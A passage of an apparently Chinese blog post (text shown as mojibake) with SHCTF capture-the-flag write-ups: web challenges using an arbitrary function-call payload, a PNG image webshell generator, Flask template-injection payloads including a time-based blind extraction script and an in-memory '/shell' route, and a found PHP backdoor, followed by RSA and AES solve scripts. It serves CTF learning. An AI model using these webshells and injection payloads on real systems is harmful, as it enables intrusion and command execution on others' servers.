<p>å…¶å®æˆ‘ä»¬å‰é¢å¿½ç•¥äº†ä¸€ç‚¹ï¼Œå°±æ˜¯out_trade_no[0]çš„å¤„ç†</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252122634.png" alt="image-20241025212255581" loading="lazy"></p>
<p>$vv[0]éœ€æ˜¯$exp_arrå­˜åœ¨çš„å¥ï¼Œæ ¹æ®184è¡Œï¼Œæˆ‘ä»¬éšä¾¿æ‰¾ä¸€ä¸ªé”® eqã€‚æ„é€ å¦‚ä¸‹payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out_trade_no[0]=eq&amp;out_trade_no[1]=calc&amp;out_trade_no[2]=exec</span><br></pre></td></tr></table></figure>

<p>ç³»ç»ŸæˆåŠŸæ‰§è¡Œäº†exec(calc)å‡½æ•°ï¼Œå®ç°äº†ä»»æ„å‡½æ•°è°ƒç”¨</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/87a906a53cfcc4947e39a76883a63591.png" alt="img" loading="lazy"></p>
<p>å›åˆ°æœ¬é¢˜ï¼Œæˆ‘ä»¬è®¿é—®&#x2F;pay&#x2F;index&#x2F;pay_callbackï¼Œpostä¼ ä¸€ä¸ª</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">out_trade_no[0]=eq&amp;out_trade_no[1]=env&amp;out_trade_no[2]=system</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252128569.png" alt="image-20241025212840514" loading="lazy"></p>
<h4 id="Week3-æ‹œå¸ˆä¹‹æ—…Â·ç•ªå¤–"><a href="#Week3-æ‹œå¸ˆä¹‹æ—…Â·ç•ªå¤–" class="headerlink" title="[Week3] æ‹œå¸ˆä¹‹æ—…Â·ç•ªå¤–"></a>[Week3] æ‹œå¸ˆä¹‹æ—…Â·ç•ªå¤–</h4><p>æˆ‘ä»¬éšä¾¿ä¼ ä¸Šä¸€å¼ pngå›¾ç‰‡</p>
<p>å½“ä¸Šä¼ ä¸€å¼ å›¾ç‰‡æˆåŠŸå,æŸ¥çœ‹å›¾ç‰‡å¯ä»¥å‘ç°æ˜¯é€šè¿‡GETä¼ æ–‡ä»¶è·¯å¾„æ¥æ˜¾ç¤ºçš„,è€ƒè™‘å­˜åœ¨includeåŒ…å«</p>
<p>æˆ‘ä»¬å°†å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ï¼Œæ”¾å…¥010ä¸­ä¸åŸæ–‡ä»¶è¿›è¡Œå¯¹æ¯”</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252135483.png" alt="image-20241025213527421" loading="lazy"></p>
<p>å‘ç°åªæœ‰ä¸€éƒ¨åˆ†ç›¸åŒï¼Œå…¶ä½™çš„å¤§å¤šè¢«æ›´æ”¹äº†ï¼Œæˆ‘ä»¬æƒ³åˆ°å›¾ç‰‡çš„äºŒæ¬¡æ¸²æŸ“</p>
<p>æ­¤æ—¶éœ€è¦æ„é€ ä¸€å¼ ä¸è¢«æ¸²æŸ“æ‰çš„pngå›¾ç‰‡é©¬,è¿™é‡Œå€Ÿç”¨äº†ç½‘ä¸Šçš„è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">    0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">    0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">    0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">    0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">    0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">    0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">    0x66, 0x44, 0x50, 0x33);</span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class="line">    $r = $p[$y];</span><br><span class="line">    $g = $p[$y+1];</span><br><span class="line">    $b = $p[$y+2];</span><br><span class="line">    $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">    imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,&#x27;1.png&#x27;);  //è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„</span><br><span class="line"></span><br><span class="line">/* æœ¨é©¬å†…å®¹</span><br><span class="line">&lt;?$_GET[0]($_POST[1]);?&gt;</span><br><span class="line"> */</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å°†ç”Ÿæˆçš„å›¾ç‰‡ä¸Šä¼ ä¸Šå»</p>
<p>å¹¶åœ¨æŸ¥çœ‹å›¾ç‰‡é¡µé¢è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET  :é¶æœºåœ°å€/?image=/upload/293146324.png&amp;0=system</span><br><span class="line"></span><br><span class="line">POST:1=tac /f*</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œä¸€æ¬¡åï¼Œæˆ‘ä»¬é‡æ–°å°†å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ï¼Œæ”¾åˆ°010é‡ŒæŸ¥çœ‹</p>
<p>å¾—åˆ°flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252142777.png" alt="image-20241025214247705" loading="lazy"></p>
<h4 id="Week3-love-flask"><a href="#Week3-love-flask" class="headerlink" title="[Week3] love_flask"></a>[Week3] love_flask</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def pretty_input():</span><br><span class="line">    return render_template_string(html_template)</span><br><span class="line">//render_template_string å…è®¸å¼€å‘è€…ç›´æ¥ä»å­—ç¬¦ä¸²ä¸­æ¸²æŸ“æ¨¡æ¿</span><br><span class="line">@app.route(&#x27;/namelist&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def name_list():</span><br><span class="line">    name = request.args.get(&#x27;name&#x27;)  </span><br><span class="line">    template = &#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27; % name</span><br><span class="line">    rendered_string =  render_template_string(template)</span><br><span class="line">    if rendered_string:</span><br><span class="line">        return &#x27;Success Write your name to database&#x27;</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;Error&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(port=8080)</span><br></pre></td></tr></table></figure>

<p>ä»æºç ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°è¾“å…¥å¯æ§ï¼Œè€Œä¸”ç»è¿‡äº†æ¸²æŸ“ï¼Œæ˜æ˜¾çš„sstiæ¨¡ç‰ˆæ³¨å…¥</p>
<p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å‘ç°æºç æ²¡æœ‰å›æ˜¾sstiçš„ç»“æœ</p>
<p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤</p>
<p>æ‰€ä»¥æˆ‘ä»¬æœ‰ä¸¤ç§åŠæ³•</p>
<p>ä¸€ç§æ˜¯ç›²æ³¨ï¼Œå› ä¸ºæ¸²æŸ“å¤±è´¥ä¼šè¿”å›500ï¼Œæ‰€ä»¥å¯ä»¥å…ˆçˆ†å‡ºeval</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/namelist?name=&#123;&#123;().__class__.__base__.__subclasses__()[&#123;&#123;int(100-200)&#125;&#125;].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;time&quot;).sleep(3)&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271448305.png" alt="image-20241027144758194" loading="lazy"></p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ å»¶æ—¶æ¥çˆ†flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">flag =&#x27;SHCTF&#123;&#x27;</span><br><span class="line">table = &#x27;-ABCDEFabcdef0123456789&#x27;</span><br><span class="line">url = &#x27;http://210.44.150.15:25528/namelist?name=&#x27;</span><br><span class="line">for len in range(7,43):</span><br><span class="line">    for i in table:</span><br><span class="line">      ii = flag +i</span><br><span class="line">      start_time = time.time()</span><br><span class="line">      data = &quot;&#123;&#123;&quot;+&quot;().__class__.__base__.__subclasses__()[100].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&quot;os\&quot;).popen(\&quot;if [ $(head -c &#123;&#125; /flag) = &#123;&#125; ]; then sleep 2; fi\&quot;).read()&#x27;)&quot;.format(len,ii) +&quot;&#125;&#125;&quot;</span><br><span class="line">      #print(data)</span><br><span class="line">      url1 = url + data</span><br><span class="line">      r = requests.get(url1)</span><br><span class="line">      end_time = time.time()</span><br><span class="line">      response_time = end_time - start_time</span><br><span class="line">      if response_time &gt;= 2:</span><br><span class="line">          flag = flag +i</span><br><span class="line">          print(flag)</span><br><span class="line">      else:</span><br><span class="line">          continue</span><br><span class="line">print(flag+&#x27;&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>if [ $(head -c {} &#x2F;flag) &#x3D; {} ]; then sleep 2; </p>
<p>**<code>head -c &#123;&#125;</code>**ï¼š</p>
<ul>
<li><code>head</code>æ˜¯ä¸€ä¸ªç”¨äºè¾“å‡ºæ–‡ä»¶å¼€å¤´éƒ¨åˆ†çš„å‘½ä»¤ã€‚</li>
<li><code>-c &#123;&#125;</code>é€‰é¡¹è¡¨ç¤ºè¾“å‡ºæ–‡ä»¶çš„å‰<code>&#123;&#125;</code>ä¸ªå­—èŠ‚ã€‚è¿™ä¸ª<code>&#123;&#125;</code>åœ¨å®é™…ä»£ç ä¸­å°†è¢«æ›¿æ¢ä¸ºä¸€ä¸ªæ•´æ•°å€¼ï¼Œä»£è¡¨è¦è¯»å–çš„å­—èŠ‚æ•°ã€‚</li>
<li><code>/flag</code>æ˜¯è¦æ£€æŸ¥çš„æ–‡ä»¶è·¯å¾„ã€‚</li>
</ul>
<p>**<code>$(...)</code>**ï¼š</p>
<ul>
<li>è¿™æ˜¯å‘½ä»¤æ›¿æ¢ï¼ˆcommand substitutionï¼‰ï¼Œç”¨äºå°†å‘½ä»¤çš„è¾“å‡ºä½œä¸ºå­—ç¬¦ä¸²æ’å…¥åˆ°å¦ä¸€ä¸ªå‘½ä»¤ä¸­ã€‚</li>
<li>åœ¨è¿™é‡Œï¼Œ<code>$(head -c &#123;&#125; /flag)</code>ä¼šè¾“å‡º<code>/flag</code>æ–‡ä»¶çš„å‰<code>&#123;&#125;</code>ä¸ªå­—èŠ‚çš„å†…å®¹ã€‚</li>
</ul>
<p>**<code>sleep 2</code>**ï¼š</p>
<ul>
<li><code>sleep</code>å‘½ä»¤ç”¨äºä½¿ç¨‹åºæš‚åœæŒ‡å®šçš„æ—¶é—´ï¼ˆåœ¨è¿™é‡Œæ˜¯2ç§’ï¼‰ã€‚</li>
<li>å¦‚æœ<code>head</code>å‘½ä»¤çš„è¾“å‡ºä¸<code>&#123;&#125;</code>ç›¸ç­‰ï¼Œåˆ™æ‰§è¡Œ<code>sleep 2</code>ï¼Œé€ æˆå“åº”å»¶è¿Ÿã€‚</li>
</ul>
<p>**<code>then ... fi</code>**ï¼š</p>
<ul>
<li><code>then</code>è¡¨ç¤ºæ¡ä»¶ä¸ºçœŸæ—¶æ‰§è¡Œçš„å‘½ä»¤å—çš„å¼€å§‹ï¼Œ<code>fi</code>è¡¨ç¤º<code>if</code>è¯­å¥çš„ç»“æŸã€‚</li>
</ul>
<h5 id="ç¬¬äºŒç§æ–¹æ³•"><a href="#ç¬¬äºŒç§æ–¹æ³•" class="headerlink" title="ç¬¬äºŒç§æ–¹æ³•"></a>ç¬¬äºŒç§æ–¹æ³•</h5><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ å†…å­˜é©¬</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD">https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å…ˆè¿è¡Œä¸€éï¼Œç„¶åå†è®¿é—®&#x2F;shell?cmd&#x3D;tac &#x2F;f*</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271528055.png" loading="lazy"></p>
<h4 id="Week3-hacked-website"><a href="#Week3-hacked-website" class="headerlink" title="[Week3] hacked_website"></a>[Week3] hacked_website</h4><p>æˆ‘ä»¬æ‰«æç›®å½•ï¼Œå‘ç°æœ‰ä¸ª<a target="_blank" rel="noopener" href="http://www.zip,æˆ‘ä»¬æŠŠå®ƒä¸‹è½½ä¸‹æ¥,ç„¶åç”¨dç›¾æ‰«æ,å‘ç°åé—¨æ–‡ä»¶/">www.zipï¼Œæˆ‘ä»¬æŠŠå®ƒä¸‹è½½ä¸‹æ¥ï¼Œç„¶åç”¨Dç›¾æ‰«æï¼Œå‘ç°åé—¨æ–‡ä»¶</a></p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271647524.png" alt="image-20241027164736366" loading="lazy"></p>
<p>æˆ‘ä»¬æ‰“å¼€è¿™ä¸ªæ–‡ä»¶</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271648116.png" alt="image-20241027164847997" loading="lazy"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $a = &#x27;sys&#x27;;$b = &#x27;tem&#x27;;$x = $a.$b;if (!isset($_POST[&#x27;SH&#x27;])) &#123;$z = &quot;&#x27;&#x27;&quot;;&#125; else $z = $_POST[&#x27;SH&#x27;];?&gt;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥å‘ç°å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œåœ¨&#x2F;admin&#x2F;profile.phpä¸‹ä¼ ä¸€ä¸ªSHæ¥è¿›è¡Œrce</p>
<p>ä½†é¦–å…ˆæˆ‘ä»¬è¦è¿›è¡Œç™»å½•</p>
<p>è¿›å…¥&#x2F;adminæ ¹æ®æ–‡ç« å‘å¸ƒè€…ï¼Œè´¦å·ä¸ºadminï¼Œçˆ†ç ´å¯†ç ï¼Œç»“æœä¸ºqwer1234</p>
<p>ç„¶åæˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ï¼Œå¾—åˆ°flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271651197.png" alt="image-20241027165129138" loading="lazy"></p>
<h5 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h5><p>åœ¨æ§åˆ¶å°-å¤–è§‚-ç¼–è¾‘å½“å‰å¤–è§‚å¤„ç¼–è¾‘æ¨¡æ¿</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271654740.png" alt="image-20241027165401679" loading="lazy"></p>
<p>ç„¶åæˆ‘ä»¬è®¿é—®index.phpï¼Œå¾—åˆ°flag</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271654308.png" alt="image-20241027165423249" loading="lazy"></p>
<h4 id="Week3-é¡°"><a href="#Week3-é¡°" class="headerlink" title="[Week3] é¡°"></a>[Week3] é¡°</h4><h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="Week1-EzAES"><a href="#Week1-EzAES" class="headerlink" title="[Week1] EzAES"></a>[Week1] EzAES</h4><p>æˆ‘ä»¬ç›´æ¥è§£å¯†å°±è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"># å¯†é’¥å’Œ IVï¼Œä½¿ç”¨åŠ å¯†æ—¶ç”Ÿæˆçš„å€¼</span><br><span class="line">key = b&#x27;p[b\x80~\xaa\xb2\xd3)l\x1eW\xcc\x85)\x10&#x27;</span><br><span class="line">iv = b&#x27;\xd0cFp=\x9eW\xad\xact&amp;\xbb\xb4\x0cV\xd4&#x27;</span><br><span class="line"></span><br><span class="line"># åˆ›å»º AES è§£å¯†å¯¹è±¡</span><br><span class="line">my_aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line"># åŠ å¯†åçš„å¯†æ–‡</span><br><span class="line">ciphertext = b&#x27;\x01\xbd\x93\x96\xa3;\x1eW\xfa\xf1\xec\x10\xb8Ks\x86\x9d]\x87\x932\xfc0\xda\r\x98\xcfv\xb4\xb4Vj5\xe8\xd1\x88\xf5\x9a\xa8\x89\xa2\xebVj;4\x90j&#x27;</span><br><span class="line"></span><br><span class="line"># è§£å¯†</span><br><span class="line">decrypted = my_aes.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line"># ç§»é™¤å¡«å……çš„ç©ºæ ¼å­—èŠ‚</span><br><span class="line">plaintext = decrypted.rstrip(b&#x27; &#x27;)</span><br><span class="line">print(plaintext)</span><br></pre></td></tr></table></figure>

<h4 id="Week1-baby-mod"><a href="#Week1-baby-mod" class="headerlink" title="[Week1] baby_mod"></a>[Week1] baby_mod</h4><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410312017171.png" alt="image-20241031201709131" loading="lazy"></p>
<p>æ­¤æ—¶æˆ‘ä»¬çŸ¥é“äº†rï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬çŸ¥é“äº†tmpï¼Œå°±èƒ½è®¡ç®—å‡ºrå¯¹äºtçš„é€†å…ƒï¼Œå°±å¯ä»¥æ±‚å‡ºpï¼Œè€Œtmpåªæœ‰15bitï¼Œå¯ä»¥å¾ˆå¿«çš„éå†å‡ºæ¥ã€‚</p>
<p>éå†pï¼Œé€ä¸€è§£å¯†å¯†æ–‡ï¼Œæ˜æ–‡ä¸­åŒ…å«SHCTFçš„å³ä¸ºæ‰€æ±‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">from tqdm import *</span><br><span class="line"></span><br><span class="line">c = 79650255924640441243783174315738119783087054428100187253964031045992984620971879440861726176524336451142891982435118150281255051661584547445199746244544425882305155402589125955199617147930949561958885307377843571691020998368159145257218511196817046406536607508747287748359813285385239057197003234628847079939</span><br><span class="line">leak = -2599222796268155672542615057820311188233596084301204730398124299903057773299164321565684294941437840950319988869184017952143214614546298874735930095707443093006166798980132582791121684360595863075969212106829764572515951966651060430710482809252673230819220874013454674514944846921907088042630911813223918291506413183923253016666716689505955468069348342349098701467897450818524506135076565</span><br><span class="line">r = 587682058314915471307923755715428788638634300872408087916288745237852083576968681013764877646877289262026854782255141434805121509775923799604299891162530112557931041695494035876437072363827072790300504458703299756480581043027342577811</span><br><span class="line">t = 786699786866467436790075506076086854735027138153074424854186047828932863337885476336794620298737490235145874475196933459185319123588161523141227394517491113980132701124357536717210954797397468992341668471278315484594606850091171557027</span><br><span class="line">e = 65537</span><br><span class="line">for tmp in trange(2**14,2**15-1):</span><br><span class="line">    if isPrime(tmp):</span><br><span class="line">        p = (leak+tmp)*gmpy2.invert(r,t) % t</span><br><span class="line">        try:</span><br><span class="line">            d = gmpy2.invert(e,p-1)</span><br><span class="line">            m = pow(c,d,p)</span><br><span class="line">            flag = long_to_bytes(m)</span><br><span class="line">            if b&#x27;SHCTF&#x27; in flag:</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>

<h4 id="Week1-d-known"><a href="#Week1-d-known" class="headerlink" title="[Week1] d_known"></a><strong>[Week1] d_known</strong></h4><p>æˆ‘ä»¬å·²çŸ¥eå’Œdçš„å€¼</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410312026817.png" alt="image-20241031202659774" loading="lazy"></p>
<p>é€šè¿‡è®¡ç®—å¯çŸ¥ï¼Œeæ˜¯17ä½ï¼Œdæ˜¯2047ä¸ºï¼Œphiå¤§æ¦‚æ˜¯2048ä½ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ¨æµ‹kçš„å€¼</p>
<p>ç„¶åæ±‚pq,q &#x3D; next_prime(p),qpæ¥è¿‘ï¼Œç›´æ¥å¯¹phiå¼€æ–¹ç„¶åç”¨next_primeã€prevprimeå³å¯æ±‚å‡ºpq</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">import sympy</span><br><span class="line">from tqdm import*</span><br><span class="line">c = 7619231789171995079294161234878423224231112429961838535540784984692964815324726959511719538222968332975752824731741518178086141907611550871403019016043596256109736194533826456432379700265157548262751707387902955474794955342745211189261217839388458558541610855570638979485715875458613584721374740387313646656453429749782646888147442107673006666786913122872882361836572072790817898782976016388830432654146591375959261230147062213668563221742359906177903255156356636148427480411387914934792027752124681828051885054176487796901097076771710538908474521518771489253933284065313644010703407250057718304709566471764216008833</span><br><span class="line">d = 4294890607908962616910170813936418137933989254123469803555687713508290441430349302109331416858412706457372735008848759911973894659751982291314717306592060486109717936934227859107527548007636110978177943504153504830427399670018088103145473328301738295079451783784918523654258608563796681268583347612365317742686170548984200881695503824129779720121644547769626667999547773210219170161559351337037056795720068516329254135806201887544486689070012222188533868735009912244250883223795602440999145676619713422671945150578230992434086632731164719925391045521061782211037385447361025091612158568846980146769425987904420426593</span><br><span class="line">e = 65537</span><br><span class="line">kphi = e*d-1</span><br><span class="line">for i in trange(2**13,2**17):</span><br><span class="line">    if kphi%i == 0:</span><br><span class="line">        phi = kphi//i</span><br><span class="line">        temp = gmpy2.iroot(phi,2)[0]</span><br><span class="line">        p = gmpy2.next_prime(temp)</span><br><span class="line">        q = sympy.prevprime(temp)</span><br><span class="line">        if d == inverse(e,(p-1)*(q-1)):</span><br><span class="line">            m = pow(c,d,p*q)</span><br><span class="line">            print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>kinsey</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://kinseyy.github.io/2024/10/05/shCTF/" title="shCTF">https://kinseyy.github.io/2024/10/05/shCTF/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> unless otherwise stated.</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/10/08/2024-NSS%E7%A7%8B%E5%AD%A3%E8%B5%9B/" rel="prev" title="2024.NSSç§‹å­£èµ›"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">2024.NSSç§‹å­£èµ›</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/10/04/SWPU2019-Web1/" rel="next" title="[SWPU2019]Web1"><span class="post-nav-text">[SWPU2019]Web1</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>å¦‚æœæ‚¨æœ‰ä»»ä½•å…³äºåšå®¢å†…å®¹çš„ç›¸å…³è®¨è®ºï¼Œæ¬¢è¿å‰å¾€ <a href="https://github.com/kinseyy/kinseyy.github.io/discussions" target="_blank">GitHub Discussions</a> ä¸æˆ‘äº¤æµã€‚</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2024/10/05/shCTF/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">è‹ICPå¤‡17038157å·</a></div><div class="copyright"><span>&copy; 2023 â€“ 2025 </span><a class="with-love" id="animate" target="_blank" rel="noopener" href="https://github.com/kinseyy" title="Github"><span class="icon iconify" data-icon="ri:github-line"></span></a><span class="author"> kinsey</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v7.2.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="footer-custom-text"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener" title="å¼€å¾€-å‹é“¾æ¥åŠ›"><img src="https://www.travellings.cn/assets/logo.gif" alt="å¼€å¾€-å‹é“¾æ¥åŠ›" width="120"></a></div></footer></div><a class="hty-icon-button" 